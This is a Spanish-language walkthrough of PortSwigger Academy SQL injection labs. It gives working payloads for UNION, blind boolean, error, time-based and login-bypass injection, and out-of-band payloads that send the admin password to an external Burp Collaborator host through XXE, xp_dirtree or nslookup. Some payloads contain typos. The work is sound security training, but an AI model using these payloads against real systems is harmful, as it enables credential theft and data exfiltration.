# PORTSWIGGER LABS

## Table of contents

- [PORTSWIGGER LABS](#portswigger-labs)
  - [SQL INJECTION](#sql-injection)
    - [SQL injection UNION attack, determining the number of columns returned by the query](#sql-injection-union-attack-determining-the-number-of-columns-returned-by-the-query)
    - [SQL injection UNION attack, finding a column containing text](#sql-injection-union-attack-finding-a-column-containing-text)
    - [SQL injection UNION attack, retrieving data from other tables](#sql-injection-union-attack-retrieving-data-from-other-tables)
    - [SQL injection UNION attack, retrieving multiple values in a single column](#sql-injection-union-attack-retrieving-multiple-values-in-a-single-column)
    - [SQL injection attack, querying the database type and version on Oracle](#sql-injection-attack-querying-the-database-type-and-version-on-oracle)
    - [SQL injection attack, querying the database type and version on MySQL and Microsoft](#sql-injection-attack-querying-the-database-type-and-version-on-mysql-and-microsoft)
    - [SQL injection attack, listing the database contents on non-Oracle databases](#sql-injection-attack-listing-the-database-contents-on-non-oracle-databases)
    - [SQL injection attack, listing the database contents on Oracle](#sql-injection-attack-listing-the-database-contents-on-oracle)
    - [Blind SQL injection with conditional responses](#blind-sql-injection-with-conditional-responses)
    - [Blind SQL injection with conditional errors](#blind-sql-injection-with-conditional-errors)
    - [Blind SQL injection with time delays](#blind-sql-injection-with-time-delays)
    - [Blind SQL injection with time delays and information retrieval](#blind-sql-injection-with-time-delays-and-information-retrieval)
    - [Blind SQL injection with out-of-band interaction](#blind-sql-injection-with-out-of-band-interaction)
    - [Blind SQL injection with out-of-band data exfiltration](#blind-sql-injection-with-out-of-band-data-exfiltration)
    - [SQL injection vulnerability in WHERE clause allowing retrieval of hidden data](#sql-injection-vulnerability-in-where-clause-allowing-retrieval-of-hidden-data)
    - [SQL injection vulnerability allowing login bypass](#sql-injection-vulnerability-allowing-login-bypass)

## SQL INJECTION

### SQL injection UNION attack, determining the number of columns returned by the query

Para resolver el laboratorio, determine el número de columnas devueltas por la consulta realizando un ataque UNION de inyección SQ que devuelve una fila adicional que contiene valores nulos.

```sql
https://ac541fff1fc8151980566b1e000c00e0.web-security-academy.net/filter?category='+UNION+SELECT+NULL--

https://ac541fff1fc8151980566b1e000c00e0.web-security-academy.net/filter?category='+UNION+SELECT+NULL,NULL--

https://ac541fff1fc8151980566b1e000c00e0.web-security-academy.net/filter?category='+UNION+SELECT+NULL,NULL,NULL--
```
 
### SQL injection UNION attack, finding a column containing text

Para resolver el laboratorio, realice un ataque UNION de inyección SQL que devuelva una fila adicional que contenga el valor proporcionado. Esta técnica le ayuda a determinar qué columnas son compatibles con los datos STRING.

```sql
https://acd61f651f7e15dc80036c14001e006f.web-security-academy.net/filter?category='+UNION+SELECT+'a',NULL,NULL--  

https://acd61f651f7e15dc80036c14001e006f.web-security-academy.net/filter?category='+UNION+SELECT+NULL,'a',NULL--  

https://acd61f651f7e15dc80036c14001e006f.web-security-academy.net/filter?category='+UNION+SELECT+NULL,NULL,'a'--  
```

### SQL injection UNION attack, retrieving data from other tables

Para resolver el laboratorio, realice un ataque UNION de inyección SQL que recupere todos los nombres de `usuario` y `contraseñas`, y use la información para iniciar sesión como `administrator` usuario.

```sql
https://ac6f1f0a1f362c3b80b31ac100280000.web-security-academy.net/filter?category='+UNION+SELECT+'a',NULL--

https://ac6f1f0a1f362c3b80b31ac100280000.web-security-academy.net/filter?category='+UNION+SELECT+'a','a'--

https://ac6f1f0a1f362c3b80b31ac100280000.web-security-academy.net/filter?category='+UNION+SELECT+username,password+from+users--
```

### SQL injection UNION attack, retrieving multiple values in a single column

Mostramos usuario y contraseña en una sola columna usando las concatenaciones

```sql

# forma1

https://acde1f681f2dc6a0801bac4400c7000e.web-security-academy.net/filter?category='+UNION+SELECT+NULL,concat(username,':',password)+from+users--

# forma2

https://acde1f681f2dc6a0801bac4400c7000e.web-security-academy.net/filter?category='+UNION+SELECT+NULL,username||'~'||password+from+users--
```

### SQL injection attack, querying the database type and version on Oracle

En las bases de datos de Oracle, cada declaración `SELECT` debe especificar una tabla para la sentencia `FROM`. Si su ataque `UNION SELECT` no consulta desde una tabla, deberá incluir la palabra clave `FROM` seguida de un nombre de tabla válido.

En esete ejemplo existe una tabla llamada **dual**

```sql
#verificar numero de columnas

https://acd91f601eb3113280ac86510018009d.web-security-academy.net/filter?category='+UNION+SELECT+'a','a'+FROM+dual--

#obtener version 

https://acd91f601eb3113280ac86510018009d.web-security-academy.net/filter?category='+UNION+SELECT+'a',version+FROM+v$instance--

# ó

https://acd91f601eb3113280ac86510018009d.web-security-academy.net/filter?category='+NION+SELECT+banner,'a'+FROM+v$version--

https://acd91f601eb3113280ac86510018009d.web-security-academy.net/filter?category='+UNION+SELECT+banner,NULL+FROM+v$version--
```

podriamos haber comprobados que tablas existian:

```sql
https://acd91f601eb3113280ac86510018009d.web-security-academy.net/filter?category='+UNION+SELECT+NULL,table_name+FROM+all_tables--
```

### SQL injection attack, querying the database type and version on MySQL and Microsoft

Este ejercicio lo tenemos que hacer desde Burp, interceptamos la peticion y editamos la categoria de la URL, la mandamos al repiter y mandamos lo siguiente:

enumerar columnas:

```sql
'+UNION+SELECT+NULL,NULL#
```

En contrar la version en mysql o microsoft sql:

```sql
'+UNION+SELECT+@@version,NULL#
````

![foto](../Portswigger%20images/SQLi1.PNG)

### SQL injection attack, listing the database contents on non-Oracle databases

Para resolver el laboratorio, inicie sesión como usuario `administrator`.

Obtener el nombre de las bases de datos:

```sql
https://acb21fb81e5d5d0880723541001000f8.web-security-academy.net/filter?category='+UNION+SELECT+NULL,table_name+FROM+information_schema.tables-- -
```

Nos damos cuenta de que  existe la tabla `users_qwxkvs`, obtener la cantidad de columnas de esa tabla:

```sql
https://acb21fb81e5d5d0880723541001000f8.web-security-academy.net/filter?category='+UNION+SELECT+NULL,column_name+FROM+information_schema.columns+where+table_name='sers_qwxkvs'- -
```

Tiene las siguientes columnas: `username_oyiubc` y `password_aiynfr`, vamos a obtener el contenido de esas columnas:

```sql
https://acb21fb81e5d5d0880723541001000f8.web-security-academy.net/filter?category='+UNION+SELECT+username_oyiubc,password_aiynfr+FROM+users_qwxkvs-- -
```

Obtener las credenciales:

![foto](../Portswigger%20images/SQLi2.PNG)

Ahora iniciamos sesion como administrador.

### SQL injection attack, listing the database contents on Oracle

Para resolver el laboratorio, inicie sesión como usuario `administrator`.

Es el mismo ejemplo del anterior solo que la sintaxis es de oracle.

Obtener el nombre de las bases de datos:

```sql
https://ac731fc51efb9d2380bb4cac00a2007d.web-security-academy.net/filter?category='+UNION+SELECT+NULL,table_name+FROM+all_tables--
```

Nos damos cuenta de que  existe la tabla `USERS_LCWCLV`, obtener la cantidad de columnas de esa tabla:

```sql
https://ac731fc51efb9d2380bb4cac00a2007d.web-security-academy.net/filter?category='+UNION+SELECT+NULL,column_name+FROM+USER_TAB_COLUMNS+WHERE+table_name='USERS_LCWCLV'--

# o tambien

https://ac731fc51efb9d2380bb4cac00a2007d.web-security-academy.net/filter?category='+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_LCWCLV'--
```

Tiene las siguientes columnas: `USERNAME_ILDCWJ` y `PASSWORD_XSPJTL`, vamos a obtener el contenido de esas columnas:

```sql
https://ac731fc51efb9d2380bb4cac00a2007d.web-security-academy.net/filter?category='+UNION+SELECT+USERNAME_ILDCWJ,PASSWORD_XSPJTL+FROM+USERS_LCWCLV--
```

Obtener las credenciales:

![foto](../Portswigger%20images/SQLi3.PNG)

Ahora iniciamos sesion como administrador.

### Blind SQL injection with conditional responses

Interceptamos la peticion con Burp y vemos que hay una cookie que es `TrackingId`, la modificamos con una sentencia booleana, el clasico **' and '1'='1**:

![foto](../Portswigger%20images/SQLi4.PNG)

Vemos el mensaje **Welcome back!**

Ahora si hacemos que la condicion booleana sea `False` con **' and '1'='2**:

![foto](../Portswigger%20images/SQLi5.PNG)

el mensaje **Welcome back!** ya no aparece, esto demuestra cómo puede probar una sola condición booleana e inferir el resultado.

Que quiere decir esto, que si una condicion es cierta el mensaje aparecera y si no lo es el mensaje no aparecera. Vamos a aprovecharnos de esto con puras condicionales booleanas:

Verificacion de existencia de una tabla:

```sql
' AND (SELECT 'a' FROM users LIMIT 1)='a

#se imprimira la letra 'a' si la tabla existe y se hara la validacion de 'a'='a'
```

Verifique que la condición sea verdadera, confirmando que hay una tabla llamada `users`.

![foto](../Portswigger%20images/SQLi6.PNG)

El mensaje si aparece.

Verificacion de usuario administrator:

```sql
' AND (SELECT 'a' FROM users WHERE username='administrator')='a
```

Verifique que la condición sea verdadera, confirmando que hay un usuario llamado `administrator`.

![foto](../Portswigger%20images/SQLi7.PNG)

El mensaje si aparece.

Ahora vamos a determinar la longitud de la password del usuario administrador:

```sql
' AND (SELECT 'a' FROM users WHERE username='administrator' and length(password)>=1)='a
```

Asumimos que existe una columna llamada `password` y con la funcion length le indicamos si la contraseña es mas larga que 1 caracter. Esto lo tenemos que llevar al intruder y repetirlo unas 20 veces o mas segun la longitud de la password, cuando el mensaje deje de salir es que la contraseña no es mas larga que el valor a comparar:

***NOTA: puede usar la comparacion de >, < o =***

![foto](../Portswigger%20images/SQLi8.PNG)

Mandamos el ataque:

![foto](../Portswigger%20images/SQLi9.PNG)

Vemos que tiene una longitud de 20 caracteres porque en el 21 ya no se muestra el mensaje, otra forma de ver es la longitud de la respuesta, en todos habia 7137 pero en el intento veinte tiene 7076 y es porque ya no hay el mensaje.

ahora debemos averiguar caracter por caracter cual pertenece, esto igual con la ayuda del intruder y el siguiente payload:

```sql
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
```

con substring sacamos letra por letra:

```bash
SUBSTRING(string, start, length)
```

Y usamos una lista alfanumerica. Esto lo tenemos que hacer 20 veces:

![foto](../Portswigger%20images/SQLi10.PNG)

Usamos una simple lista de a-zA-Z0-9:

![foto](../Portswigger%20images/SQLi11.PNG)

Vemos como muestra un resultado:

![foto](../Portswigger%20images/SQLi12.PNG)

La primera letra es 'm', seguimos asi para todas, al final asi queda:

> password -> mtyorzgxa53se6oosuoe

Obviamente lo puedes automatizar mas con un ataque cluster bomb y lo haces de una sola pasada.

Ahora iniciamos sesion como administrador.

### Blind SQL injection with conditional errors

Entramos al reto e interceptamos la peticion hacia la categoria **gitf**, se ve una cookie **TrackingId**:

![foto](../Portswigger%20images/SQLi13.png)

si colocamos una comilla simple al final del valor de la cookie vemos que lanza un error:

![foto](../Portswigger%20images/SQLi14.png)

si colocamos dos comillas simples vemos que ya no nos muestra el error porque es como si cerraramos una cadena (\'\'):

![foto](../Portswigger%20images/SQLi15.png)

el reto indica que es una base de datos **oracle** que tiene una tabla llamada **users**, los campos **username** y **password** y un usuario **administrator**.

podemos usar concatenaciones entre comillas para realizar una subconsulta, como es una base de datos oracle concatenamos con (**||**), en oracle hay una tabla por defecto llamada **dual** y podemos usar para hacer pruebas porque sabemos que esta tabla existe:

```sql
'||(select '' from dual)||'
```

vemos que la tabla existe al no mostrarnos el error:

![foto](../Portswigger%20images/SQLi16.png)

pero si colocamos una tabla que no existe mostraria un error:

![foto](../Portswigger%20images/SQLi17.png)

podemos usar este **select** para ver si algo existe o no pero tiene que devolver un solo valor para que la concatenacion (**||**) no se rompa, entonces usaremos condicionales en la consulta:


```sql
'||(select CASE WHEN (1=1) THEN to_char(1/0) ELSE '' END from dual)||'
```

estamos colocando un condicional **IF** en sintaxis SQL dentro del select, si **1=1** entonces queremos que nos haga una conversion a char de la division 1/0, esta division mostrara un error porque no se puede dividir 1/0, caso contrario no muesrta nada. La siguiente consulta mostrara un eror porqur **1=1**:

![foto](../Portswigger%20images/SQLi18.png)

si modificamos para que vaya al else y no muestre nada modificamos a **1=2**:

```sql
'||(select CASE WHEN (1=2) THEN to_char(1/0) ELSE '' END from dual)||'
```

![foto](../Portswigger%20images/SQLi19.png)

entonces podemos jugar con esto para verificar datos, primero veamos si existe el usuario administrador de la tabla users:

```sql
'||(select CASE WHEN (1=1) THEN to_char(1/0) ELSE '' END from users where username='administrator')||
```

nos devuelve error y eso quiere decir que existe por el condicional:

![foto](../Portswigger%20images/SQLi20.png)

porque si colocamos **1=2** se quita el error:

![foto](../Portswigger%20images/SQLi21.png)

ahora tambien podemos ir jugando con la sentencia del condicional, en lugar de **1=1** podemos calcular la longitud exacta de la contraseña, podemos realizar verificar si `length(password=N` donde N seria la longitud exacta de la contraseña y esto lo podemos automatizar con el **intruder** de modo que cuando muestre un estado 500 de error sabremos la logitud de password, senecesita usar una lista de numeros en secuencia del 1 al 50:

```sql
'||(select CASE WHEN (length(password)=§1§) THEN to_char(1/0) ELSE '' END from users where username='administrator')||'
```

![foto](../Portswigger%20images/SQLi22.png)

a logitud de password es **20**.

ahora podemos calcular cada una de las letras de su contraseña comparando una subcadena de cada letra y comparando con un diccionario de letras minusculas, mayusculas y numeros. Nuevamente un ataque cluster bomb como el anterior ejercicio:

para obtener una subcadena en **oracle** se usa la funcion **SUBSTR**

```sql
'||(select CASE THEN to_char(1/0) ELSE '' END from users where username='administrator')||'
```

![foto](../Portswigger%20images/SQLi23.png)

![foto](../Portswigger%20images/SQLi24.png)

![foto](../Portswigger%20images/SQLi25.png)

filtrando por el codigo de estado 500 y ordenando se tiene la siguiente contraseña:

|user|password|
|:----:|:----:|
|administrator|qpj32u3fcg157r9d1yfl|

inicias sesion como administrator y ya resuelto el lab.

### Blind SQL injection with time delays

Tenemos que causar un delay de 10 segundos para completar el lab.

Segun el DBMS asi es como podemos testear:

|DATABASE|SINTAX|
|:-----:|:-----:|
|Oracle |	dbms_pipe.receive_message(('a'),10)|
|Microsoft |	WAITFOR DELAY '0:0:10'|
|PostgreSQL |	pg_sleep(10)|
|MySQL |	SELECT sleep(10)|

Entramos al reto e interceptamos la peticion hacia la categoria **gitf**, se ve una cookie **TrackingId**, es lo que vamos a testear de un sql injection time based, debemos cerrar el trackid con (\') y concatenar el sleep, en este caso funciono con el de **Postgres** por lo que la conatenacion se lo hace con (**||**) y el delay con (**pg_sleep(10)**)

![foto](../Portswigger%20images/SQLi26.png)

asi se logra superar el laboratorio.

### Blind SQL injection with time delays and information retrieval

Nuevamente debemos interceptar la cookie **trackingId**, se tiene una base de datos **Postgre** (lo tuve que testear), una tabla **users**, campos **username** y **password** y dbemos obtener la contraseña del usuario administrador e iniciar sesion como él.

Para empezar algo muy importante es que esta vez y no como los anteriores ejercicios, la cookie trackingId tiene un punto y coma al final de su contenido:

![foto](../Portswigger%20images/SQLi27.png)

bien ese caracter nos dara problemas por lo que debemos URL encodearlo, su equivalente es **%3b**, vamos a colocar una comilla simple antes del **;** que ahora sera **%3b**:

![foto](../Portswigger%20images/SQLi28.png)

no pasa nada, bueno podemos tstear los siguientes payload basados en tiempo con condicional:

|DBMS|PAYLOAD|
|:-----:|:----:|
|Oracle|`SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual`|
|Microsoft|`IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'`|
|PostgreSQL|`SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END`|
|MySQL|`SELECT IF(YOUR-CONDITION-HERE,sleep(10),'a')`|

en este caso funciona el de **postgres** y lo colocaremos despues de **%3b** y al final lo comentamos (**-- -**)

la prueba de concepto seria la siguiente:

```sql
'%3bSELECT pg_sleep(10)-- -
```

![foto](../Portswigger%20images/SQLi29.PNG)

vemos que tardo 10 segundos en responder, por lo que si tiene un **SQLi time based**, ahora para recopilar informacion y aprovecharnos de esta inyeccion debemos usarlo con un condicional:

```sql
'%3bSELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END-- -
```

![foto](../Portswigger%20images/SQLi30.PNG)

Estamos poniendo un condicional en el que si **1=1** hara un sleep de 10 segundo y sino nada (sleep de 0 segundos). Esto no mostrara nada pero si tardara 10 segundos en responder.

Entonces vamos a recopilar informacion muy similar al los ejercicios anteriores, en este caso veremos si algo es verdadero si tarda 5 segundos, caso contrario es falso. Comprobacion de que el usuario **administrator** existe:

```sql
'%3bSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END from users where username='administrator'--
```

![foto](../Portswigger%20images/SQLi31.PNG)

tarda 5 segundo por lo que existe ese usuario, si colocamos otro no tarda 5 segundos:

![foto](../Portswigger%20images/SQLi32.PNG)

ahora vamos a ver la longitud de su password, para esto utilizaremos el **intruder** y jugaremos con la longitud

```sql
'%3bSELECT+CASE+WHEN+(length(password)=§1§)+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END from users where username='administrator'--
```

al mandarlo al intruder en el intento 20 tarda 5 segundos en darle la respuesta, asi que ya sabemos que la contraseña de administrator tiene una longitud de 20 caracteres:

```sql
'%3bSELECT+CASE+WHEN+(length(SUBSTRING(password,§1§,1)='§c§')+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END from users where username='administrator'--
```

![foto](../Portswigger%20images/SQLi33.PNG)

ahora con un ataque cluster bomb y el intruder vamos a intentar adivinar cada caracter de su conrtaseña:

![foto](../Portswigger%20images/SQLi34.PNG)

![foto](../Portswigger%20images/SQLi35.PNG)

![foto](../Portswigger%20images/SQLi36.PNG)

filtrando por el tiempo de respuesta y ordenando se tiene la siguiente contraseña:

|user|password|
|:----:|:----:|
|administrator|267cmlbya2uj27mmvcl3|

inicias sesion como administrator y ya resuelto el lab.


### Blind SQL injection with out-of-band interaction

En este ejercicio la inyeccion esta en la cookie **trackingID** y podemos  desencadenar interacciones fuera de banda con un dominio externo. Para ello haremos uso de **Burp Collaborator**

Podemos probar los siguientes payloads:

|DBMS|PAYLOAD|
|:-----:|:-----:|
|Oracle|La siguiente técnica aprovecha una vulnerabilidad de entidad externa XML ( [XXE](https://portswigger.net/web-security/xxe) ) para activar una búsqueda de DNS. Se ha parcheado la vulnerabilidad, pero existen muchas instalaciones de Oracle sin parche: `SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://YOUR-SUBDOMAIN-HERE.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual`  La siguiente técnica funciona en instalaciones de Oracle con parches completos, pero requiere privilegios elevados: `SELECT UTL_INADDR.get_host_address('YOUR-SUBDOMAIN-HERE.burpcollaborator.net')`|
|Microsoft|`exec master..xp_dirtree '//YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a'`|
|PostgreSQ|`copy (SELECT '') to program 'nslookup YOUR-SUBDOMAIN-HERE.burpcollaborator.net'`|
|MySQL|Las siguientes técnicas funcionan solo en Windows: `LOAD_FILE('\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\\a')` `SELECT ... INTO OUTFILE '\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\a'`|

Para nuestro caso funciono el de **Oracle**

```sql
'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//8x6ws4fh2vho10965mty4fkjhan1bq.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual--;
```

![foto](../Portswigger%20images/SQLi37.png)

y se resuelve el laboratorio.

### Blind SQL injection with out-of-band data exfiltration

Es el mismo caso del anterior ejercicio pero con exfiltracion de datos, debemos obtene la contraseña del usuario administrador e iniciar sesion. Podemos probar los siguientes payloads:

|DBMS|PAYLOAD|
|:----:|:----:|
|Oracle|`SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual`|
|Microsoft|`declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a"')`|
|PostgreSQL|`create OR replace function f() returns void as \$\$ <br /> declare c text;  <br /> declare p text;  <br />begin  <br />SELECT into p (SELECT YOUR-QUERY-HERE);  <br />c := 'copy (SELECT '''') to program ''nslookup '||p||'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net''';  <br />execute c;  <br />END;  <br />$$ language plpgsql security definer;  <br />SELECT f();`|
|MySQL|The following technique works on Windows only:  <br /> `SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\a'`|

en nuestro caso funciono el de **Oracle**:

```sql
'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.j2m0mopfd1v6e0ojq4eeb4r3wu2lqa.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual-- session=42olHtHabkYW1AnwWSXT4x2uv6GLUrT1
```

vemos que nos devuelve un 200 OK:

![foto](../Portswigger%20images/SQLi38.png)

el resultado de nuestra QUERY se encuentra en el oyente de **burp collaborator** si vamos a ver el trafico que se inetrcepta vemos unas comunicaciones **DNS** y **HTTP**, la contraseña es el siguiente valor (lo que se encuentra en el subdominio):

![foto](../Portswigger%20images/SQLi39.png)

Iniciamos sesion y habremos esuelto el laboratorio.

### SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

Este laboratorio contiene una vulnerabilidad de inyección de SQL en el filtro de categoría de producto. Cuando el usuario selecciona una categoría, la aplicación realiza una consulta SQL como la siguiente:

`SELECT * FROM products WHERE category = 'Gifts' AND released = 1`

Para resolver el laboratorio, realice un ataque de inyección SQL que haga que la aplicación muestre detalles de todos los productos en cualquier categoría, tanto lanzados como no lanzados.

este es el ejemplo mas basico de SQL injection, podemos mandar el siguiente payload

```sql
gifts' or 1=1--
```

lo que pasara al reemplazar:

```sql
SELECT * FROM products WHERE category = 'gifts' or 1=1--' AND released = 1
```

es que comentara la parte de **released** que es lo que muesrta cierta informacion y consultara que muestre **gifts** o que verifique si 1 s igual a 1 (1=1) lo que es verdadero y mostrara todos los resultados.

con eso se completa el laboratorio.

### SQL injection vulnerability allowing login bypass

Este es el mismo ejemplo que el anterior ejercicio y se lo resuelve con el mismo payload. Debemos hacer un bypass de login para ingresar como el usuario administrador. Capturamos la peticion y le modificamos el campo **password** agregando lo siguiente

```sql
'+or+1=1--
```

puedes poner cualquier contraseña o dejarlo vacio el campo:

![foto](../Portswigger%20images/SQLi40.png)

tiene un token CSRF por lo que no podemos mandarlo al repeater, asi que el lo que interceptamos lo modificamos.

con eso logramos hacer un bypass del inicio de sesion e ingresar como el usuario **administrator**.